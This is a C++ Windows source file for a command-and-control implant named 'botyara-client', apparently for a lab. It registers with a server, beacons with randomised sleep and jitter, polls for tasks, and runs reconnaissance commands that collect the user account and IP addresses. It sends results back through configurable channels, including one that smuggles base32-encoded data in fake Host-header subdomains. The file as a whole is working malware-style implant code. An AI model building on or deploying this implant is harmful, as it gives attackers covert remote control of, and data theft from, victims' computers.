#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#define _WIN32_WINNT 0x0A00
#define SECURITY_WIN32
#include <winsock2.h>
#include <windows.h>
#include <security.h>
#include <winhttp.h>
#include <iphlpapi.h>
#include <iptypes.h>
#include <ws2tcpip.h>
#include <secext.h>
#include <algorithm>
#include <cmath>
#include <chrono>
#include <cctype>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <random>
#include <regex>
#include <sstream>
#include <stdexcept>
#include <string>
#include <thread>
#include <vector>
#include "json.hpp"
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "secur32.lib")

using nlohmann::json;

struct Handle {
    HINTERNET value;
    explicit Handle(HINTERNET raw) : value(raw) { if (!value) throw std::runtime_error("WinHTTP failed: " + std::to_string(GetLastError())); }
    ~Handle() { WinHttpCloseHandle(value); }
    Handle(const Handle&) = delete;
    Handle& operator=(const Handle&) = delete;
};

struct StatusError : std::runtime_error {
    int code;
    StatusError(int status, const std::string& body) : std::runtime_error("HTTP " + std::to_string(status) + ": " + body), code(status) {}
};

std::string env(const char* name, const std::string& fallback) {
    DWORD size = GetEnvironmentVariableA(name, nullptr, 0);
    if (!size) return fallback;
    std::string value(size, '\0');
    GetEnvironmentVariableA(name, value.data(), size);
    value.resize(size - 1);
    return value.empty() ? fallback : value;
}

std::wstring wide(const std::string& text) {
    if (text.empty()) return L"";
    int size = MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, text.data(), (int)text.size(), nullptr, 0);
    if (!size) throw std::runtime_error("Invalid UTF-8");
    std::wstring out(size, L'\0');
    MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, text.data(), (int)text.size(), out.data(), size);
    return out;
}

std::string utf8(const std::wstring& text) {
    if (text.empty()) return "";
    int size = WideCharToMultiByte(CP_UTF8, 0, text.data(), (int)text.size(), nullptr, 0, nullptr, nullptr);
    std::string out(size, '\0');
    WideCharToMultiByte(CP_UTF8, 0, text.data(), (int)text.size(), out.data(), size, nullptr, nullptr);
    return out;
}

std::string quote(const std::string& text) {
    static const char* digits = "0123456789ABCDEF";
    std::string out;
    for (unsigned char c : text) {
        if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.' || c == '~') out += (char)c;
        else { out += '%'; out += digits[c >> 4]; out += digits[c & 15]; }
    }
    return out;
}

json send(const std::string& method, const std::string& endpoint, const std::string& transport,
          const std::string& field, const json& value, const std::string& payload,
          const std::string& host, const std::string& server) {
    std::string address = server;
    while (!address.empty() && address.back() == '/') address.pop_back();
    address += "/" + endpoint;
    std::string body, contentType;
    if (transport == "json") { body = json{{field, value}}.dump(); contentType = "application/json"; }
    else if (transport == "query" || transport == "form") {
        std::string text = value.is_string() ? value.get<std::string>() : value.dump();
        std::string pair = quote(field) + "=" + quote(text);
        if (transport == "query") address += "?" + pair;
        else { body = pair; contentType = "application/x-www-form-urlencoded"; }
    } else if (transport != "host") throw std::runtime_error("Unknown transport");

    std::wstring url = wide(address);
    URL_COMPONENTS parsed{}; parsed.dwStructSize = sizeof(parsed);
    parsed.dwHostNameLength = parsed.dwUrlPathLength = parsed.dwExtraInfoLength = (DWORD)-1;
    if (!WinHttpCrackUrl(url.c_str(), 0, 0, &parsed)) throw std::runtime_error("Invalid BOT_SERVER URL");
    std::wstring serverHost(parsed.lpszHostName, parsed.dwHostNameLength);
    std::wstring path(parsed.lpszUrlPath, parsed.dwUrlPathLength);
    if (parsed.dwExtraInfoLength) path.append(parsed.lpszExtraInfo, parsed.dwExtraInfoLength);
    Handle session(WinHttpOpen(L"botyara-client/1", WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0));
    WinHttpSetTimeouts(session.value, 5000, 5000, 5000, 5000);
    Handle connection(WinHttpConnect(session.value, serverHost.c_str(), parsed.nPort, 0));
    Handle request(WinHttpOpenRequest(connection.value, wide(method).c_str(), path.c_str(), nullptr, WINHTTP_NO_REFERER,
                                  WINHTTP_DEFAULT_ACCEPT_TYPES, parsed.nScheme == INTERNET_SCHEME_HTTPS ? WINHTTP_FLAG_SECURE : 0));
    std::wstring headers;
    if (!payload.empty()) headers += L"X-Payload-UUID: " + wide(payload) + L"\r\n";
    if (!contentType.empty()) headers += L"Content-Type: " + wide(contentType) + L"\r\n";
    if (!headers.empty() && !WinHttpAddRequestHeaders(request.value, headers.c_str(), (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD)) throw std::runtime_error("Cannot set headers");
    if (transport == "host" && !WinHttpAddRequestHeaders(request.value, (L"Host: " + wide(host)).c_str(), (DWORD)-1,
        WINHTTP_ADDREQ_FLAG_REPLACE | WINHTTP_ADDREQ_FLAG_ADD)) throw std::runtime_error("Cannot set Host header");
    if (!WinHttpSendRequest(request.value, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        body.empty() ? WINHTTP_NO_REQUEST_DATA : (LPVOID)body.data(), (DWORD)body.size(), (DWORD)body.size(), 0))
        throw std::runtime_error("Send failed: " + std::to_string(GetLastError()));
    if (!WinHttpReceiveResponse(request.value, nullptr)) throw std::runtime_error("Receive failed: " + std::to_string(GetLastError()));
    DWORD status = 0, statusSize = sizeof(status);
    if (!WinHttpQueryHeaders(request.value, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX,
                             &status, &statusSize, WINHTTP_NO_HEADER_INDEX)) throw std::runtime_error("Missing HTTP status");
    std::string response;
    while (true) {
        DWORD available = 0;
        if (!WinHttpQueryDataAvailable(request.value, &available)) throw std::runtime_error("Read failed");
        if (!available) break;
        std::string chunk(std::min<DWORD>(available, 65537), '\0'); DWORD read = 0;
        if (!WinHttpReadData(request.value, chunk.data(), (DWORD)chunk.size(), &read)) throw std::runtime_error("Read failed");
        response.append(chunk.data(), read);
        if (response.size() > 65536) throw std::runtime_error("Response too large");
    }
    if (status < 200 || status >= 300) throw StatusError((int)status, response);
    return json::parse(response);
}

std::string base32(const std::string& data) {
    static const char* alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
    int buffer = 0, bits = 0; std::string result;
    for (unsigned char c : data) {
        buffer = (buffer << 8) | c; bits += 8;
        while (bits >= 5) { bits -= 5; result += alphabet[(buffer >> bits) & 31]; buffer &= (1 << bits) - 1; }
    }
    if (bits > 0) result += alphabet[(buffer << (5 - bits)) & 31];
    return result;
}

json profileRequest(const std::string& endpoint, const std::string& operation, const json& value, const json& config) {
    const json& rule = config.at("profile").at(operation);
    std::string method = rule.at("method"), transport = rule.at("transport"), field = rule.at("field");
    std::string payload = config.at("payload_uuid"), server = config.at("server_url");
    if (transport != "host") return send(method, endpoint, transport, field, value, payload, "", server);
    std::string text = value.is_string() ? value.get<std::string>() : value.dump();
    if (text.empty() || text.size() > 20000) throw std::runtime_error("Host data must be 1..20000 UTF-8 bytes");
    std::string encoded = base32(text);
    int count = (int)(encoded.size() + 49) / 50;
    std::random_device device; std::string id;
    static const char* hex = "0123456789abcdef";
    for (int i = 0; i < 6; ++i) { unsigned char byte = (unsigned char)device(); id += hex[byte >> 4]; id += hex[byte & 15]; }
    json result;
    for (int i = 0; i < count; ++i) {
        std::string host = "m." + id + "." + std::to_string(i + 1) + "." + std::to_string(count) + "." + encoded.substr(i * 50, 50) + ".demo.test";
        result = send(method, endpoint, "host", field, value, payload, host, server);
        if (i < count - 1 && !result.contains("received")) throw std::runtime_error("Server rejected Host part");
    }
    return result;
}

void validateConfig(const json& config) {
    static const std::regex uuid("^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$");
    if (!std::regex_match(config.at("payload_uuid").get<std::string>(), uuid)) throw std::runtime_error("Invalid payload UUID");
    for (const auto& op : {"checkin", "get_task", "post_task"}) {
        const json& rule = config.at("profile").at(op);
        std::string method = rule.at("method"), transport = rule.at("transport"), field = rule.at("field");
        if ((method != "GET" && method != "POST") ||
            (transport != "json" && transport != "form" && transport != "query" && transport != "host") ||
            field.empty() || field.size() > 64 || (method == "GET" && transport != "query" && transport != "host"))
            throw std::runtime_error(std::string("Invalid profile rule ") + op);
    }
}

json loadConfig(const std::string& path, const std::string& server, const std::string& profile) {
    json config;
    std::ifstream input(wide(path), std::ios::binary);
    if (input) {
        config = json::parse(input);
        if (config.at("server_url") != server) throw std::runtime_error("BOT_SERVER does not match saved config");
    } else {
        config = send("POST", "payloads", "json", "profile", profile, "", "", server);
        config["server_url"] = server;
        auto parent = std::filesystem::u8path(path).parent_path();
        if (!parent.empty()) std::filesystem::create_directories(parent);
        std::ofstream output(wide(path), std::ios::binary);
        if (!output) throw std::runtime_error("Cannot create config file");
        output << config.dump(2);
    }
    validateConfig(config);
    return config;
}

std::string execute(const std::string& command) {
    if (command == "exit") return "Выхожу";
    if (command == "whoami") {
        ULONG length = 0; GetUserNameExW(NameSamCompatible, nullptr, &length);
        std::wstring name(length, L'\0');
        if (!GetUserNameExW(NameSamCompatible, name.data(), &length)) throw std::runtime_error("GetUserNameEx failed");
        name.resize(length);
        std::string result = utf8(name);
        std::transform(result.begin(), result.end(), result.begin(), [](unsigned char c) { return (char)std::tolower(c); });
        return result;
    }
    if (command == "ip") {
        ULONG size = 15000;
        std::vector<unsigned char> buffer(size);
        ULONG status = GetAdaptersAddresses(AF_UNSPEC, 0, nullptr, (IP_ADAPTER_ADDRESSES*)buffer.data(), &size);
        if (status == ERROR_BUFFER_OVERFLOW) { buffer.resize(size); status = GetAdaptersAddresses(AF_UNSPEC, 0, nullptr, (IP_ADAPTER_ADDRESSES*)buffer.data(), &size); }
        if (status != NO_ERROR) throw std::runtime_error("GetAdaptersAddresses failed");
        std::vector<std::string> lines;
        for (auto* adapter = (IP_ADAPTER_ADDRESSES*)buffer.data(); adapter; adapter = adapter->Next) {
            for (auto* address = adapter->FirstUnicastAddress; address; address = address->Next) {
                char ip[NI_MAXHOST]{};
                if (getnameinfo(address->Address.lpSockaddr, address->Address.iSockaddrLength, ip, sizeof(ip), nullptr, 0, NI_NUMERICHOST) == 0)
                    lines.push_back(utf8(adapter->FriendlyName) + ": " + ip);
            }
        }
        if (lines.empty()) return "IP адресов не нашёл";
        std::ostringstream out;
        for (size_t i = 0; i < lines.size(); ++i) { if (i) out << '\n'; out << lines[i]; }
        return out.str();
    }
    throw std::runtime_error("Unknown command");
}

int main() {
    try {
        std::string server = env("BOT_SERVER", "http://127.0.0.1:5000");
        std::string profile = env("BOT_PROFILE", "standard");
        if (profile != "standard" && profile != "mixed" && profile != "host") throw std::runtime_error("Invalid BOT_PROFILE");
        double sleep = std::stod(env("BOT_SLEEP", "5")), jitter = std::clamp(std::stod(env("BOT_JITTER", "0.3")), 0.0, 1.0);
        if (!(sleep > 0) || !std::isfinite(sleep)) throw std::runtime_error("Invalid BOT_SLEEP");
        std::string path = env("BOT_CONFIG", "payload-" + profile + ".json");
        json config = loadConfig(path, server, profile);
        std::cout << "Config: " << path << " Payload: " << config.at("payload_uuid") << std::endl;
        std::string callback = profileRequest("checkin", "checkin", config.at("payload_uuid"), config).at("callback_uuid");
        std::cout << "Callback: " << callback << std::endl;
        json pending = nullptr;
        std::mt19937 generator(std::random_device{}()); std::uniform_real_distribution<double> random(-jitter, jitter);
        while (true) {
            try {
                if (pending.is_null()) {
                    json task = profileRequest("poll", "get_task", callback, config).at("task");
                    if (!task.is_null()) {
                        std::string command = task.at("command");
                        std::string result;
                        try { result = execute(command); } catch (const std::exception& e) { result = std::string("Ошибка: ") + e.what(); }
                        if (result.size() > 20000) result.resize(20000);
                        pending = {{"task", task}, {"result", result}};
                        std::cout << "Task: " << task.at("task_id") << " " << command << std::endl;
                    }
                }
                if (!pending.is_null()) {
                    json task = pending.at("task");
                    profileRequest("results", "post_task", {{"callback_uuid", callback}, {"task_id", task.at("task_id")}, {"result", pending.at("result")}}, config);
                    std::cout << "Result sent: " << task.at("task_id") << std::endl;
                    if (task.at("command") == "exit") return 0;
                    pending = nullptr;
                }
            } catch (const StatusError& e) {
                if (e.code >= 400 && e.code < 500) throw;
                std::cerr << "Connection failed, retrying: " << e.what() << std::endl;
            } catch (const std::exception& e) { std::cerr << "Connection failed, retrying: " << e.what() << std::endl; }
            std::this_thread::sleep_for(std::chrono::milliseconds((int)(1000 * std::max(0.1, sleep * (1 + random(generator))))));
        }
    } catch (const std::exception& e) { std::cerr << e.what() << std::endl; return 1; }
}
